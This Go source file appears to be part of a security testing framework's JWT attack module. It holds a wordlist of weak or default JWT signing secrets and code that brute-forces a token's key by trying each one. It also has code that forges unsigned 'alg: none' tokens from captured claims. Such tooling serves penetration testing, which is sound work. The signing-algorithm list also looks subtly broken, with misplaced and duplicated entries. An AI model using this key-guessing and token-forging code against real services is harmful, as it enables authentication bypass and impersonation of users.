package authhack

import (
	"fmt"
	"github.com/dgrijalva/jwt-go"
	"yaklang.io/yaklang/common/utils"
)

var (
	jwtWeakkeyRaw = `secret
...
012345678901234567890123456789XY
12345
12345678901234567890123456789012
61306132616264382D363136322D343163332D383364362D316366353539623436616663
61306132616264382d363136322d343163332d383364362d316366353539623436616663
872e4e50ce9990d8b041330c47c9ddd11bec6b503ae9386a99da8584e9bb12c4
8zUpiGcaPkNhNGi8oyrq
A43CC200A1BD292682598DA42DAA9FD14589F3D8BF832FFA206BE775259EE1EA
C2A4EB068AF8ABEF18D80B1689C7D785
GQDstcKsx0NHjPOuXOYg5MbeJ1XT0uFiwDVvVBrk
Hello, World!
J5hZTw1vtee0PGaoAuaW
[107 105 97 108 105]
kiali
My super secret key!
Original secret string
R9MyWaEoyiMYViVWo8Fk4TUGWiSoaW6U1nOqXri8_XU
RfxRP43BIKoSQ7P1GfeO
Secret key. You can use ` + "`" + `mix guardian.gen.secret` + "`" + `to get one
SecretKey
Setec Astronomy
SignerTest
Super Secret Key
THE_SAME_HMAC_KEY
ThisIsMySuperSecret
XYZ
YOUR_HMAC_KEY
YoUR sUpEr S3krEt 1337 HMAC kEy HeRE
]V@IaC1%fU,DrVI
` + "`" + `mix guardian.gen.secret` + "`" + `
a43cc200a1bd292682598da42daa9fd14589f3d8bf832ffa206be775259ee1ea
banana
bar
c2a4eb068af8abef18d80b1689c7d785
client_secret_basic
custom
default-key
example-hmac-key
example_key
fe1a1915a379f3be5394b64d14794932
gZH75aKtMN3Yj0iPS4hcgUuTwjAzZr9C
guest
hard!to-guess_secret
has a van
her key
his key
key
key1
key2
key3
kkey
mix guardian.gen.secret
my key
my super secret password
my$ecretK3y
my_very_long_and_safe_secret_key
mypass
mysecretkey
mysupersecretkey
newSecret
password
secret-key
secret123
secret_key
secret_key_here
secretkey
shared-secret
shared_secret
shhhhh
shhhhhhared-secret
some-secret-string
super-secret-password
super_fancy_secret
supersecret
symmetric key
test-key
testing1
token
too many secrets
top secret
verysecret
wrong-secret
xxx
your-256-bit-secret
your-384-bit-secret
your-512-bit-secret
your-own-jwt-secret
your-top-secret-key
jwt
jwt-secret
hmac-secret
hs256-secret
AC8d83&21Almnis710sds
123456`
	JwtAlgs = []jwt.SigningMethod{
		jwt.SigningMethodES384,
		jwt.SigningMethodES256,
		jwt.SigningMethodES512,

		jwt.SigningMethodHS256,
		jwt.SigningMethodHS384,
		jwt.SigningMethodES512,

		jwt.SigningMethodPS256,
		jwt.SigningMethodPS384,
		jwt.SigningMethodPS512,

		jwt.SigningMethodRS256,
		jwt.SigningMethodPS384,
		jwt.SigningMethodPS512,

		&AuthHackJWTSigningNone{},
	}
	algsToAlgsInstance = map[string]jwt.SigningMethod{}
	weakJWTTokenKeys   = utils.ParseStringToLines(jwtWeakkeyRaw)
)

func init() {
	for _, i := range JwtAlgs {
		algsToAlgsInstance[i.Alg()] = i
	}
	weakJWTTokenKeys = utils.RemoveRepeatedWithStringSlice(weakJWTTokenKeys)
}

func NewJWTHelper(alg string) (*jwt.Token, error) {
	if alg == "" || alg == "none" || alg == "None" {
		return jwt.New(&AuthHackJWTSigningNone{}), nil
	}

	algIns, ok := algsToAlgsInstance[alg]
	if !ok {
		return nil, utils.Errorf("not supported alg: %v in %v", alg, AvailableJWTTokensAlgs())
	}
	return jwt.New(algIns), nil
}

func AvailableJWTTokensAlgs() []string {
	var res []string
	for _, i := range JwtAlgs {
		res = append(res, i.Alg())
	}
	return res
}

func JwtGenerate(alg string, extraData map[string]interface{}, typ string, key []byte) (string, error) {
	token, err := NewJWTHelper(alg)
	if err != nil {
		return "", err
	}
	claims := make(jwt.MapClaims)
	for k, v := range extraData {
		claims[k] = v
	}
	token.Claims = claims
	if typ == "" {
		token.Header["typ"] = "JWT"
	} else {
		token.Header["typ"] = typ
	}
	return token.SignedString(key)
}

func JwtParse(tokenStr string, keys ...string) (*jwt.Token, []byte, error) {
	firstToken, _ := jwt.Parse(tokenStr, func(token *jwt.Token) (interface{}, error) {
		return nil, nil
	})
	if firstToken != nil && len(firstToken.Header) > 0 {
		if utils.StringArrayContains([]string{
			"None", "none",
		}, fmt.Sprint(firstToken.Header["alg"])) {
			return firstToken, nil, nil
		}
	}

	for _, i := range append(weakJWTTokenKeys, keys...) {
		token, err := jwt.Parse(tokenStr, func(token *jwt.Token) (interface{}, error) {
			return []byte(i), nil
		})
		if err != nil {
			continue
		}

		if len(token.Header) <= 0 {
			continue
		}

		if !token.Valid {
			continue
		}

		return token, []byte(i), nil
	}

	return firstToken, nil, nil
	// return nil, nil, utils.Errorf("cannot guess jwt key token: %v", tokenStr)
}

func JwtChangeAlgToNone(token string) (string, error) {
	t, _, err := JwtParse(token)
	if err != nil {
		return "", utils.Errorf("invalid token: %v", token)
	}
	newToken := jwt.New(&AuthHackJWTSigningNone{})
	newToken.Header = t.Header
	newToken.Claims = t.Claims
	return newToken.SignedString(nil)
}
